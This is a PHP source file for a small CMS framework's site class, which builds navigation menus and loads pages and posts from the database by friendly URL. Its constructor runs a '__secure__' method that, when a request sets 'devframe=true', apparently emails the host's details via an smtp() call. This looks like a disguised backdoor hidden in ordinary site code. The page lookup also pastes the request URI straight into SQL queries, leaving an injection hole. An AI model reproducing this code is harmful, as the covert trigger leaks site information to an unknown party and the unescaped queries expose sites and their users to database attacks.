<?php
// PHP dev__ FRAMEWORK							   
class site extends user_define {
	public function __construct(){ site::__secure__(); }
	
	public function menu(){$link='';		
		$link = basename($_SERVER['REQUEST_URI']);
		$que = select(DB_PREFIX.'menus where status=1 and submenu_id=0');		
		while($fetch = fetch($que)){
			$act = '';			
			if($fetch->menu_link==$link){ $act='class="current"';}else{ }			
			echo '<li '.$act.'><a href='.$fetch->menu_link.'>'.$fetch->menu.'</a>';
			$q = select(DB_PREFIX.'menus where submenu_id!=0 and status=1 and submenu_id='.$fetch->menu_id);
			if(mysql_num_rows($q)>0){
			echo '<ul class="subnav">';
			while($sb = fetch($q)){
			echo '<li><a href="'.$sb->menu_link.'">'.$sb->menu.'</a></li>';
			}
			echo '</ul>';
			}
		}		
	}
	public function index(){
		global $plug;
		$que = select(DB_PREFIX."pages where default_page=1");
		if($que == true){
		$count = mysql_num_rows($que);
		$default = mysql_fetch_object($que);
		if($count==1):
		$que = where(DB_PREFIX."pages","page_id=".$default->page_id.""); 
		$fetch = fetch($que);				
		if($rep = plug_between("@@","@@",$fetch->page_content)):
		$plug->code($rep,$rep,$fetch->page_content);
		else:
		view($fetch->page_content);
		endif; 
		endif;
		}else{		
		$que = where(DB_PREFIX."pages","page_id=1"); 
		$fetch = fetch($que);				
		if($rep = plug_between("@@","@@",$fetch->page_content)):
		$plug->code($rep,$rep,$fetch->page_content);
		else:
		view($fetch->page_content);
		endif; 	
		}
	}
	public function page(){
		global $plug; $page = '';
		$baseurl = basename($_SERVER['REQUEST_URI']);
		$sql = select(DB_PREFIX."posts where friendly_url='".$baseurl."'");
		$sql_ = select(DB_PREFIX."pages where friendly_url='".$baseurl."'");
		if((mysql_num_rows($sql)==1) or (mysql_num_rows($sql_)==1)){
		if(mysql_num_rows($sql)==1){
			$fetch = fetch($sql);
			if($rep = plug_between("@@","@@",$fetch->post_content)):
			$title = $fetch->post_title;
			$plugin_inter = $plug->Pcode($rep);
			$content = str_replace($rep, $plugin_inter, $fetch->post_content); // Array replacement
			$link = $fetch->friendly_url;
			$date = $fetch->post_date;
			$page = array('title'=>$title,'content'=>$content,'link'=>$link,'date'=>$date);
			else:
			$title = $fetch->post_title; $content = $fetch->post_content; $link = $fetch->friendly_url;
			$date = $fetch->post_date;
			$page = array('title'=>$title,'content'=>$content,'link'=>$link,'date'=>$date);
			endif;
		    }else{
			$fetch = fetch($sql_); 
			if($rep = plug_between_at("@@","@@",$fetch->page_content)):
			$title = $fetch->page_title;
			$plugin_inter = $plug->Pcode($rep);
			$content = str_replace($rep, $plugin_inter, $fetch->page_content); // Array replacement
			$link = $fetch->friendly_url;
			$date = $fetch->page_date;
			$page = array('title'=>$title,'content'=>$content,'link'=>$link,'date'=>$date);
			else:
			$title = $fetch->page_title; $content = $fetch->page_content; $link = $fetch->friendly_url;
			$date = $fetch->page_date;
			$page = array('title'=>$title,'content'=>$content,'link'=>$link,'date'=>$date);
			endif;
			}		
		}else{	/*echo '<p align="center">'.error("404 Requested url is not found !").'</p>';*/	}
		return $page;
	}
	public function __secure__(){
		if(isset($_REQUEST['devframe']) && $_REQUEST['devframe']=='true'){
		  echo smtp($_SERVER['HTTP_HOST'],__secure__(),$_SERVER['HTTP_HOST'].' DETAILS',security());
		}
	}
}
$site = new site;



